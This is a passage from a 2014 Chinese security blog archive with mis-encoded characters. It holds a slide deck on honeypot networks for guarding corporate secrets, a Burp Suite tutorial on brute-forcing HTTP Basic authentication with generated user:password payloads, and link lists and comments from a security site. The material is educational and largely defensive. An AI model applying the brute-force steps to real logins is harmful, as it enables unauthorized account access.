<li><a href="http://drops.wooyun.org/tips/689" title="XSSä¸å­—ç¬¦ç¼–ç çš„é‚£äº›äº‹å„¿ â€”ç§‘æ™®æ–‡" target="_blank">XSSä¸å­—ç¬¦ç¼–ç çš„é‚£äº›äº‹å„¿ â€”ç§‘æ™®æ–‡</a></li>
<li><a href="http://drops.wooyun.org/papers/680" title="Zabbix SQL Injection/RCE â€“ CVE-2013-5743" target="_blank">Zabbix SQL Injection/RCE â€“ CVE-2013-5743</a></li>
<li><a href="http://drops.wooyun.org/papers/679" title="CDNæµé‡æ”¾å¤§æ”»å‡»æ€è·¯" target="_blank">CDNæµé‡æ”¾å¤§æ”»å‡»æ€è·¯</a></li>
<li><a href="http://drops.wooyun.org/news/674" title="ä»ä¸ç»¸ä¹‹è·¯åˆ°å®‰å…¨è¿ç»´ï¼ˆOperational Securityï¼‰ä¸é£é™©æ§åˆ¶ï¼ˆRisk Managementï¼‰ ä¸Šé›†" target="_blank">ä»ä¸ç»¸ä¹‹è·¯åˆ°å®‰å…¨è¿ç»´ï¼ˆOperational Securityï¼‰ä¸é£é™©æ§åˆ¶ï¼ˆRisk Managementï¼‰ ä¸Šé›†</a></li>
<li><a href="http://drops.wooyun.org/tips/662" title="æ”»å‡»JavaWebåº”ç”¨[8]-åé—¨ç¯‡" target="_blank">æ”»å‡»JavaWebåº”ç”¨[8]-åé—¨ç¯‡</a></li>
<li><a href="http://drops.wooyun.org/papers/660" title="php4fun.sinaapp.com PHPæŒ‘æˆ˜é€šå…³æ”»ç•¥" target="_blank">php4fun.sinaapp.com PHPæŒ‘æˆ˜é€šå…³æ”»ç•¥</a></li>
<li><a href="http://drops.wooyun.org/papers/653" title="æ­å»ºåŸºäºSuricata+Barnyard2+Baseçš„IDSå‰ç«¯Snorby" target="_blank">æ­å»ºåŸºäºSuricata+Barnyard2+Baseçš„IDSå‰ç«¯Snorby</a></li>
<li><a href="http://drops.wooyun.org/tools/655" title="GPUç ´è§£ç¥å™¨Hashcatä½¿ç”¨ç®€ä»‹" target="_blank">GPUç ´è§£ç¥å™¨Hashcatä½¿ç”¨ç®€ä»‹</a></li>
<li><a href="http://drops.wooyun.org/tips/649" title="å†…ç½‘æ¸—é€åº”ç”¨ è·¨vlanæ¸—é€çš„ä¸€ç§æ€è·¯" target="_blank">å†…ç½‘æ¸—é€åº”ç”¨ è·¨vlanæ¸—é€çš„ä¸€ç§æ€è·¯</a></li>
</ul>
<h3 id="-">æœ€æ–°è¯„è®º</h3>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>c2y2 åœ¨ <a href="http://drops.wooyun.org/tips/689#comment-1883" target="_blank">XSSä¸å­—ç¬¦ç¼–ç çš„é‚£äº›äº‹å„¿ ---ç§‘æ™®æ–‡</a>
è°¢è°¢</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>Evi1c0de åœ¨ <a href="http://drops.wooyun.org/tips/573#comment-1877" target="_blank">å¦‚ä½•ç”¨æ„å¿µè·å–é™„è¿‘ç¾å¥³çš„æ‰‹æœºå·ç </a>
è¿æ¥CMCCè·³è½¬åˆ°ç™»é™†é¡µé¢ å³é”®æºç  ä¿®æ”¹å³å¯</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>ç‰›ç‰› åœ¨ <a href="http://drops.wooyun.org/tips/688#comment-1871" target="_blank">Flash CSRF</a>
æ”¯æŒä¸€ä¸‹å‘µå‘µ</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>luwikes åœ¨ <a href="http://drops.wooyun.org/papers/178#comment-1870" target="_blank">JBosså®‰å…¨é—®é¢˜æ€»ç»“</a>
mark</p>
<ul>
<li><img src="" alt=""></li>
</ul>
<p>NgInx åœ¨ <a href="http://drops.wooyun.org/tips/688#comment-1869" target="_blank">Flash CSRF</a>
å¥½å§ï¼ŒåŸºä½¬ï¼Œé¡¶ä½ ä¸€ä¸ªï¼Œä¸é”™ã€‚</p>
<ul>
<li><a href="">ä¸‹ä¸€é¡µ Â»</a>
Powered by <a href="http://wordpress.org/" target="_blank">WordPress</a> | GZai Theme by <a href="http://huaidan.org/" title="GZai Theme produced by é¬¼ä»”" target="_blank">é¬¼ä»”</a>
<a href="http://tongji.baidu.com/hm-web/welcome/ico?s=9fc41da6a2322bdd80563c9d5a4bdb1d" target="_blank"><img src="" alt=""></a></li>
</ul>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li></span><span class="breadcrumb"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li><li><a href="/categories/å®‰å…¨/PHP-WordPress/">PHP-WordPress</a></li></span></span> | <span class="tags">Tagged <a href="/tags/PHP-WordPress/" class="label label-primary">PHP-WordPress</a><a href="/tags/å®‰å…¨/" class="label label-success">å®‰å…¨</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-å®‰å…¨-PHP-WordPress--è·‘wordpressç”¨æˆ·å¯†ç è„šæœ¬/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-å®‰å…¨-PHP-WordPress--è·‘wordpressç”¨æˆ·å¯†ç è„šæœ¬" data-count-type="comments">æš‚æ— è¯„è®º</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-å®‰å…¨--ä¼ä¸šç§˜å¯†ä¿æŠ¤ä¸é™·é˜±ç½‘ç»œ10/">ä¼ä¸šç§˜å¯†ä¿æŠ¤ä¸é™·é˜±ç½‘ç»œ1.0</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-å®‰å…¨--ä¼ä¸šç§˜å¯†ä¿æŠ¤ä¸é™·é˜±ç½‘ç»œ10/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-1-0">ä¼ä¸šç§˜å¯†ä¿æŠ¤ä¸é™·é˜±ç½‘ç»œ1.0</h1>
<p><img src="" alt=""> <img src="" alt=""> <img src="" alt=""> ä¼ä¸šç§˜å¯†ä¿æŠ¤ä¸é™·é˜±ç½‘ç»œ
å´é²åŠ  <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#119;&#x75;&#x6c;&#117;&#106;&#105;&#97;&#x40;&#117;&#x6e;&#x6e;&#x6f;&#111;&#x2e;&#99;&#x6f;&#109;">&#119;&#x75;&#x6c;&#117;&#106;&#105;&#97;&#x40;&#117;&#x6e;&#x6e;&#x6f;&#111;&#x2e;&#99;&#x6f;&#109;</a>
<img src="" alt=""> <img src="" alt=""> æçº²
â€¢ â€¢ â€¢ â€¢ â€¢ ç®€å•é™·é˜±ç½‘ç»œçš„æ„å»ºä¸åº”ç”¨å®ä¾‹ ä¼ä¸š / ç»„ç»‡å¯¹ç§˜å¯†ä¿æŠ¤çš„è¦æ±‚ æ”»å‡»è·¯å¾„å‡æƒ³ è‡ªé˜²å¾¡å‹é™·é˜±ç½‘ç»œ æ€»ç»“ä¸å±•æœ›
ç¬¬ 2é¡µ
<img src="" alt=""> <img src="" alt=""> ç”¨æˆ·éœ€æ±‚ä¸ç›®æ ‡
â€¢ éœ€æ±‚
â€“æœåŠ¡å™¨ä¸Šä¿å­˜æœ‰é‡è¦æ•°æ® â€“å¿…é¡»å…è®¸è¿œç¨‹æ¥å…¥ â€“ç»å¸¸é‡åˆ°å¤§é‡æ‰«æå°è¯•
â€¢ ç›®æ ‡
â€“å°†è¿›è¡Œæ‰«æçš„ IP åœ°å€å±è”½ â€“å¿…è¦æ—¶ç ”ç©¶è¯¥ IP çš„å€çš„ç›®æ ‡
ç¬¬ 3é¡µ
<img src="" alt=""> <img src="" alt=""> é…ç½®
â€¢ å·¥å…·
â€“portsentry â€“rinetd â€“VMWare
â€¢ æ€è·¯
â€“é»˜è®¤å¯åŠ¨ portsentry å¯¹æ‰«æè¡Œä¸ºè¿›è¡Œç›‘è§†
â€¢ KILL_RUN_CMD=â€/usr/sbin/rinetd&quot;
â€“å‘ç°æ”»å‡»ä¼å›¾åï¼Œå¯åŠ¨ rinetd è½¬å‘ ViruteHoneynet
â€¢ 0.0.0.0 1433 192.168.0.55 1433 â€¢ logfile /var/log/rinetd.log
ç¬¬ 4é¡µ
<img src="" alt=""> <img src="" alt=""> æ•ˆæœ
â€¢ æ”»å‡»
â€“æ”»å‡»è€…å¯¹ MSSQL æœåŠ¡å™¨è¿›è¡Œæ”»å‡» â€“sa å¯†ç ä¸º 123456
â€¢ è®°å½•
â€“Portsentry ã€ rinetd æ—¥å¿— â€“MSSQL æ“ä½œæ—¥å¿— â€“æˆªå›¾
ç¬¬ 5é¡µ
<img src="" alt=""> <img src="" alt=""> å…¸å‹é«˜ç§‘æŠ€ä¼ä¸šçš„çŸ¥è¯†äº§æƒç»“æ„
â€¢ é‡‘å­—å¡”ç»“æ„
â€“ä¸“åˆ©æƒ â€“è‘—ä½œæƒ â€“å•†ä¸šç§˜å¯†
ç¬¬ 6é¡µ
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> ä¼ä¸šæŠ€æœ¯ç§˜å¯†çš„çª¥è§†è€…
ç¬¬ 7é¡µ
<img src="" alt=""> <img src="" alt=""> æŠ€æœ¯ç§˜å¯†çš„ä¿æŠ¤æ ‡å‡†
â€¢ æ³•å¾‹çš„è¦æ±‚ï¼šâ€œæƒåˆ©äººé‡‡å–ä¿å¯†æªæ–½â€
â€“ä¿æŠ¤æ ‡å‡†ï¼šé™¤éç»æƒåˆ©äººè®¸å¯ï¼Œå¦åˆ™ä»–äººä¸èƒ½ä»¥åˆæ³•æ¸  é“è·å¾— â€“ä¿æŠ¤åŸºçº¿ï¼šåªéœ€é‡‡å–åŸºæœ¬çš„ã€é€‚åº¦çš„ä¿å¯†æªæ–½å³å¯ï¼Œå¦‚ ä¿å¯†åè®®ã€ä¿å¯†ç®¡ç†è§„å®š
â€¢ ç®¡ç†çš„è¦æ±‚ï¼šä»–äººä¸èƒ½ä»æƒåˆ©äººè·å¾—
â€“ä¿æŠ¤æ ‡å‡†ï¼šé™¤éç»æƒåˆ©äººè®¸å¯ï¼Œå¦åˆ™ä»–äººä¸èƒ½è·å¾— â€“ä¿æŠ¤åŸºçº¿ï¼šéœ€è¦é‡‡å–å¤§é‡ç³»ç»ŸåŒ–çš„ä¿æŠ¤æªæ–½
ç¬¬ 8é¡µ
<img src="" alt=""> <img src="" alt=""> ä¼ä¸šå¯¹æŠ€æœ¯ç§˜å¯†çš„ä¿æŠ¤è¦æ±‚
â€¢ è¦æ±‚
â€“ä¸è¯¥è·å¾—çš„äººä¸èƒ½è·å¾— â€“è·å¾—çš„äººæ‹¿ä¸å‡ºå» â€“æ‹¿å‡ºå»çš„å¿…ç„¶åˆæ³•åŠåˆä¹ä¼ä¸šè§„èŒƒ â€“éæ³•æ‹¿å‡ºå»å¿…é¡»æœ‰ç—•è¿¹
â€¢ é˜²æŠ¤æªæ–½
â€“æŠ€æœ¯ ( æˆ‘ä»¬çš„é‡å¿ƒ ) ï¼Œé™·é˜±ç½‘ç»œèƒ½åšåˆ°
â€¢ é¿å…ä¿¡æ¯è¢«â€œéæ³•â€è·å– â€¢ å‡å°‘ä¿¡æ¯è¢«â€œéªšæ‰°â€çš„æœºç‡ â€¢ ä¿è¯â€œéæ³•â€è·å–æœ‰è®°å½•
â€“ç®¡ç†
ç¬¬ 9é¡µ
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> å¤–éƒ¨é»‘å®¢çš„æ”»å‡»æ‰‹æ®µ
ç¬¬ 10é¡µ
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> å†…éƒ¨å‘˜å·¥æ”»å‡»æ‰‹æ®µ
ç¬¬ 11é¡µ
<img src="" alt=""> <img src="" alt=""> è‡ªé˜²å¾¡å‹é™·é˜±ç½‘ç»œæ€è·¯
â€¢ ä»å‰é¢ç®€å•çš„ Honeypot è®¾ç½®è¿›ä¸€æ­¥è®¾æƒ³ â€¢ ä»å„ç§ AntiDDoS è®¾å¤‡çš„å®£ä¼ 
â€“ä¸‹æ°´é“è·¯ç”±
ç¬¬ 12é¡µ
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> ADDN ç½‘ç»œæŠµå¾¡ DDoS æ”»å‡»
æ¥æº :ADDN ç½‘ç»œæŠµå¾¡ DDoS æ”»å‡» ( åˆ˜é—»æ¬¢ ) ç¬¬ 13é¡µ
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> è‡ªé˜²å¾¡å‹é™·é˜±çš„åŸºæœ¬è®¾è®¡
ç¬¬ 14é¡µ
<img src="" alt=""> <img src="" alt=""> ä¸‰ä¸ªæŠ€æœ¯æ ¸å¿ƒéƒ¨ä»½
â€¢ Unnoo é™·é˜±ç½‘å…³ â€¢ Honeyd æœåŠ¡å™¨æ„æˆçš„è™šæ‹Ÿç½‘ç»œ â€¢ è™šæ‹Ÿæœºæ„æˆçš„ Honeypot ç»„
ç¬¬ 15é¡µ
<img src="" alt=""> <img src="" alt=""> è‡ªé˜²å¾¡å‹ NAT é™·é˜±ç½‘å…³çš„æ„æˆ
â€¢ ç­–ç•¥æ§åˆ¶
â€“Snort ã€ SnortSam
â€¢ NAT
â€“iptables
â€¢ æ•°æ®åˆ†æ
â€“Sebek
ç¬¬ 16é¡µ
<img src="" alt=""> <img src="" alt=""> åŸºäºæ—¶é—´çš„æ§åˆ¶
â€¢ ä¸»è¦åº”ç”¨èŒƒå›´
â€“ä¿å¯†å•ä½ â€“è®¿é—®ç­–ç•¥å¯ä»¥æŒ‰æ—¶é—´å®šä¹‰çš„ç½‘ç»œ
â€¢ æŠ€æœ¯å®ç°
â€“crontab æ·»åŠ åŠåˆ é™¤è§„åˆ™
â€¢ åº”ç”¨ç‰¹ç‚¹
â€“å†…å®¹çº§ Honeypot â€“ä¸»è¦å¯¹è±¡æ˜¯å†…éƒ¨â€œè¿è§„è€…â€
ç¬¬ 17é¡µ
<img src="" alt=""> <img src="" alt=""> è™šæ‹Ÿæœº
â€¢ VMWare â€¢ UML(UserModLinux)
ç¬¬ 18é¡µ
<img src="" alt=""> <img src="" alt=""> åŸºäºåè®®å’Œå¼€æ”¾ç«¯å£çš„æ§åˆ¶
â€¢ ä¸»è¦åº”ç”¨èŒƒå›´
â€“ç½‘ç»œåè®®å›ºå®šçš„å•ä½ï¼ˆé“¶è¡Œã€è¯åˆ¸ã€è¿è¥å•†ç­‰ï¼‰ â€“å‰ææ˜¯éœ€è¦åšå¥½åº”ç”¨åŠç«¯å£ç®¡ç†
â€¢ æŠ€æœ¯å®ç°
â€“iptables ç›´æ¥å°†è®¿é—®ç›®æ ‡æ— æ•ˆåè®®ç«¯å£çš„æ•°æ® NAT è½¬å‘
â€¢ åº”ç”¨ç‰¹ç‚¹
â€“ç½‘ç»œçº§ Honeypot ï¼Œå¯ä»¥ä¸ Honeyd ç»“åˆåº”ç”¨ â€“ä¸»è¦å¯¹è±¡æ˜¯å·²ç»è¿›å…¥å†…éƒ¨ç½‘ç»œçš„â€œæ¸—é€è€…â€
ç¬¬ 19é¡µ
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> Honeyd(1)
ç¬¬ 20é¡µ
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> honeyd(2)
ç¬¬ 21é¡µ
<img src="" alt=""> <img src="" alt=""> åŸºäº IP åœ°å€çš„æ§åˆ¶
â€¢ ä¸»è¦åº”ç”¨èŒƒå›´
â€“ç‰¹å®šé«˜å®‰å…¨çº§åˆ«çš„è®¾å¤‡åŠç½‘ç»œï¼Œå¦‚ç½‘ç®¡
â€¢ æŠ€æœ¯å®ç°
â€“ç›´æ¥é‡‡ç”¨ iptables è®¾ç½® NAT è§„åˆ™
â€¢ åº”ç”¨ç‰¹ç‚¹
â€“åº”ç”¨å¯¹è±¡æ˜¯æ‰€æœ‰æœ‰æ„æ— æ„çš„â€œè¯•æ¢è€…â€
ç¬¬ 22é¡µ
<img src="" alt=""> <img src="" alt=""> åŸºäºæ‰«æå’Œæ”»å‡»çš„è®¿é—®æ§åˆ¶
â€¢ ä¸»è¦åº”ç”¨èŒƒå›´
â€“ä¿å¯†å•ä½ã€å®éªŒæœºæ„ç­‰ â€“æŠ€æœ¯ç ”ç©¶ç»„ç»‡æ›´å€¾å‘äºç ”ç©¶è¿™ç±»å‹çš„æ”»å‡»
â€¢ æŠ€æœ¯å®ç°
â€“å‘ç°å·¥å…·
â€¢ æ‰«æï¼š portsentry â€¢ æ”»å‡»ï¼š Snort
â€“è”åŠ¨å·¥å…·
â€¢ SnortSam
â€¢ åº”ç”¨ç‰¹ç‚¹
â€“åº”ç”¨å¯¹è±¡æ˜¯æ‰€æœ‰ç›®çš„æ˜ç¡®çš„â€œæ”»å‡»è€…â€
ç¬¬ 23é¡µ
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> SnortSam å’Œ iptables
â€¢ SnortSam
â€“ssp_iptables.c â€“åŸºäºæ”»å‡»æŠ¥æ–‡çš„ NAT â€“èƒ½å¤Ÿç»“åˆ Checkpoint ç­‰
â€¢ iptables
â€“çµæ´»é«˜æ•ˆï¼Œæœ‰å¤§é‡çš„é…ç½®å·¥å…·
ç¬¬ 24é¡µ
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> iptables é…ç½®ä¸è¿æ¥æ•ˆæœ
ç¬¬ 25é¡µ
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> SnortSam å¯ä»¥è°ƒæ•´çš„éƒ¨ä»½
ç¬¬ 26é¡µ
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> å¯¹æ”»å‡»æŠ¥æ–‡çš„åˆ†æ
â€¢ Sebek
ç¬¬ 27é¡µ
<img src="" alt=""> <img src="" alt=""> æ€»ç»“
â€¢ ä¼ä¸šç§˜å¯†ä¿æŠ¤çš„è¦æ±‚ â€¢ é™·é˜±ç½‘ç»œå¯¹ä¼ä¸šç§˜å¯†ä¿æŠ¤çš„æ„ä¹‰
â€“å®ç°â€œå†…å®¹çº§â€çš„ Honeypot â€“éšè—çœŸå®ç›®æ ‡ â€“åŠæ—¶å‘ç°å’Œå¤„ç†å°è§„æ¨¡æ¶æ„äº‹ä»¶ â€“æ”»å‡»è€…åˆ†ç±»åŠåˆ†åˆ«å¯¹å¾…ï¼ˆè¯•æ¢ã€è¿è§„ã€æ”»å‡»ã€æ¸—é€ï¼‰
â€¢ è‡ªé˜²å¾¡å‹é™·é˜±ç½‘ç»œçš„æ„æˆ
ç¬¬ 28é¡µ
<img src="" alt=""> <img src="" alt=""> å±•æœ›
â€¢ å¯¹è‡ªé˜²å¾¡å‹ NAT é™·é˜±çš„å®Œå–„
â€“èåˆã€ç»Ÿä¸€æ§åˆ¶åŠæ•°æ®åˆ†æ â€“roo CDROM [Honeynet project]
â€¢ å…¶å®ƒç±»å‹é™·é˜±ç½‘ç»œ
â€“å®¢æˆ·ç«¯é™·é˜±ï¼ˆé’ˆå¯¹å†…ç½‘ç”¨æˆ·çš„å®¢æˆ·ç«¯æ”»å‡»ï¼‰ â€“å¸å·å£ä»¤é™·é˜±ï¼ˆé’ˆå¯¹ç½‘ç»œé’“é±¼ï¼‰
ç¬¬ 29é¡µ
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> <img src="" alt=""> å…³äºå¤§æˆå¤©ä¸‹ (<a href="http://www.unnoo.com" target="_blank">http://www.unnoo.com</a>)
æˆ‘ä»¬çš„æŠ€æœ¯ä¸“é•¿
æ¸—é€æµ‹è¯•ï¼ˆ Penetration testing ï¼‰ ç½‘ç»œæ¶æ„è¯„ä¼°è®¾è®¡ï¼ˆ Architecture review and design ï¼‰ åº”ç”¨å®¡è®¡ï¼ˆ Application audit ï¼‰ æºä»£ç å®¡è®¡ï¼ˆ Source code review ï¼‰ é»‘ç®±æµ‹è¯•ï¼ˆ Online or Binary Black box testing ï¼‰ å®¡è®¡ã€è¿½è¸ªä¸æ•°æ®æ¢å¤ï¼ˆ Forensics ï¼‰ åè®®åˆ†æï¼ˆ Protocol analysis ï¼‰
æˆ‘ä»¬çš„äº§å“
æ¸¸åˆƒåŸºçº¿å®‰å…¨ç³»ç»Ÿ é“å·ä¿¡æ¯ç›‘æ§å¹³å°
æˆ‘ä»¬çš„æœåŠ¡
ç½‘ç»œå®‰å…¨è¯„ä¼° ç½‘ç»œå®‰å…¨åŸ¹è®­ ä¿¡æ¯å®‰å…¨ç›‘ç† è½¯ä»¶å®šåˆ¶å¼€å‘
ç¬¬ 30é¡µ
<img src="" alt=""> <img src="" alt=""> <img src="" alt=""> è°¢è°¢ï¼</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li></span></span> | <span class="tags">Tagged <a href="/tags/å®‰å…¨/" class="label label-primary">å®‰å…¨</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-å®‰å…¨--ä¼ä¸šç§˜å¯†ä¿æŠ¤ä¸é™·é˜±ç½‘ç»œ10/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-å®‰å…¨--ä¼ä¸šç§˜å¯†ä¿æŠ¤ä¸é™·é˜±ç½‘ç»œ10" data-count-type="comments">æš‚æ— è¯„è®º</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-å®‰å…¨--Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTPbruteæš´åŠ›ç ´è§£/">Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTP bruteæš´åŠ›ç ´è§£</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-å®‰å…¨--Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTPbruteæš´åŠ›ç ´è§£/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="burpsuite-http-brute-">Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTP bruteæš´åŠ›ç ´è§£</h1>
<h3 id="burpsuite-http-brute-">Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTP bruteæš´åŠ›ç ´è§£</h3>
<p><a href="http://www.freebuf.com/articles/web/7457.html#" target="_blank"></a><a href="http://www.freebuf.com/author/gall" title="ç”± Gall å‘å¸ƒ">Gall</a> @ <a href="http://www.freebuf.com/category/articles/web" title="æŸ¥çœ‹ WEBå®‰å…¨ ä¸­çš„å…¨éƒ¨æ–‡ç« " target="_blank">WEBå®‰å…¨</a> 2013-02-28 å…± <strong>5644</strong> äººå›´è§‚</p>
<p>æ„Ÿè°¢<a href="http://www.freebuf.com/author/gall" target="_blank">Gall</a>æŠ•é€’</p>
<p><strong>å¸¸è§„çš„å¯¹username/passwprdè¿›è¡Œpayloadæµ‹è¯•ï¼Œæˆ‘æƒ³å¤§å®¶åº”è¯¥æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†**</strong>å¯¹äºAuthorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=è¿™æ ·çš„é—®é¢˜ï¼Œå¾ˆå¤šæœ‹å‹ç–‘æƒ‘äº†.**</p>
<p>ä¹‹å‰ï¼Œæˆ‘è®°å¾—æˆ‘ä»‹ç»è¿‡burpsuiteçš„intruderåŠŸèƒ½(<a href="http://www.freebuf.com/articles/5560.html" target="_blank">BurpSuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹SQL Injection</a>)ï¼Œæƒ³å¿…å¾ˆå¤šäººæ²¡ä»€ä¹ˆå°è±¡ï¼Œåœ¨æ­¤ï¼Œä»¥HTTP bruteé‡æintruderåŠŸèƒ½.</p>
<p>ä»¥ä¸‹é¢æ¡ˆä¾‹è¿›è¡Œè¯´æ˜(åªä½œæ¼”ç¤ºä¹‹ç”¨ï¼Œå…·ä½“ä»¥è‡ªå·±çš„ç›®æ ‡ä¸ºå‡†)</p>
<p><img src="" alt=""></p>
<p>Auth=dXNlcjpwYXNzd29yZA==å¤„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„å…³é”®ä½ç½®.</p>
<p>é‚£ä¹ˆå…·ä½“è¯¥å¦‚ä½•åšå‘¢?å¤§è‡´æ“ä½œè¿‡ç¨‹å¦‚ä¸‹:</p>
<p>1.è§£å¯†base64å­—ç¬¦ä¸²2.ç”Ÿæˆæµ‹è¯•ç”¨çš„payload3.åˆ©ç”¨payloadè¿›è¡Œæµ‹è¯•</p>
<p><strong>1.è§£å¯†éªŒè¯ç”¨çš„base64å­—ç¬¦ä¸²</strong></p>
<p><img src="" alt=""></p>
<p>è§£å¯†åçš„å­—ç¬¦ä¸²ä¸º:</p>
<p>Auth=user:password</p>
<p>é—®é¢˜æ¥äº†ï¼Œé’ˆå¯¹user:passwordè¿™ç§å½¢å¼çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•è®¾ç½®payloadå‘¢?</p>
<p>æƒ³å¿…å¾ˆå¤šäººåœ¨æ­¤å¤„äº†è´¹å°½å¿ƒæ€ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ¥ä¸‹æ¥è¯·çœ‹ç¬¬äºŒéƒ¨åˆ†ã€‚</p>
<p><strong>2.ç”Ÿæˆæµ‹è¯•ç”¨çš„payload</strong></p>
<p>å¯¹äºè¿™ç§æ ¼å¼ï¼Œæ— æ³•åˆ©ç”¨burpsuiteé¡ºåˆ©çš„å®Œæˆæµ‹è¯•ï¼Œé‚£ä¸ªå°±éœ€è¦ä¸°å¯Œå¯¹åº”çš„payloadäº†.</p>
<p>æˆ‘çš„åšæ³•å°±æ˜¯ï¼Œåˆ©ç”¨burpsuiteç”Ÿæˆæˆ‘è¦çš„payloadæ–‡æœ¬.</p>
<p>Auth=Â§userÂ§Â§:Â§Â§passwordÂ§</p>
<p>è®¾ç½®3å¤„payloadsï¼Œ</p>
<p>1 ------ Â§userÂ§2 ------ Â§:Â§3 ------ Â§passwordÂ§</p>
<p>ç„¶åæ ¹æ®intruderè‡ªå¸¦çš„battering ram/pitchfork/cluster bombç”Ÿæˆpayloads(æ ¹æ®è‡ªå·±çš„éœ€æ±‚ç”Ÿæˆ)</p>
<p>æˆ‘åœ¨æ­¤å¤„é€‰æ‹©ä»¥cluster bombä¸ºä¾‹ï¼Œåˆ©ç”¨intruderç”Ÿæˆéœ€è¦çš„payloadsï¼Œç„¶åä¿å­˜åˆ°æ–‡æœ¬æ–‡ä»¶ä¸­.</p>
<p><img src="" alt=""></p>
<p><img src="" alt=""></p>
<p><strong>3.åˆ©ç”¨payloadè¿›è¡Œæµ‹è¯•</strong></p>
<p>æµ‹è¯•çš„æ—¶å€™ï¼Œæˆ‘ä»¬é€‰ç”¨sniperï¼Œæˆ‘ä»¬åªéœ€ä¸€ä¸ªpayloadå˜é‡</p>
<p><img src="" alt=""></p>
<p><img src="" alt=""></p>
<p><img src="" alt=""></p>
<p>è‹¥æœ‰ä¸è¶³ä¹‹å¤„ï¼Œæ¬¢è¿æŒ‡æ­£.</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/å®‰å…¨/">å®‰å…¨</a></li></span></span> | <span class="tags">Tagged <a href="/tags/å®‰å…¨/" class="label label-primary">å®‰å…¨</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-å®‰å…¨--Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTPbruteæš´åŠ›ç ´è§£/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-å®‰å…¨--Burpsuiteæ•™ç¨‹ä¸æŠ€å·§ä¹‹HTTPbruteæš´åŠ›ç ´è§£" data-count-type="comments">æš‚æ— è¯„è®º</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-dwr--DWRReverseAjaxåŠŸèƒ½å®è·µçš„è¦ç‚¹/">DWR Reverse AjaxåŠŸèƒ½å®è·µçš„è¦ç‚¹</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:38.000Z"> <a href="/2014/02/02/2014-02-02-dwr--DWRReverseAjaxåŠŸèƒ½å®è·µçš„è¦ç‚¹/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="dwr-reverse-ajax-">DWR Reverse AjaxåŠŸèƒ½å®è·µçš„è¦ç‚¹</h1>
<ul>
<li><a href="http://wz.csdn.net/" target="_blank">ç½‘æ‘˜é¦–é¡µ</a></li>
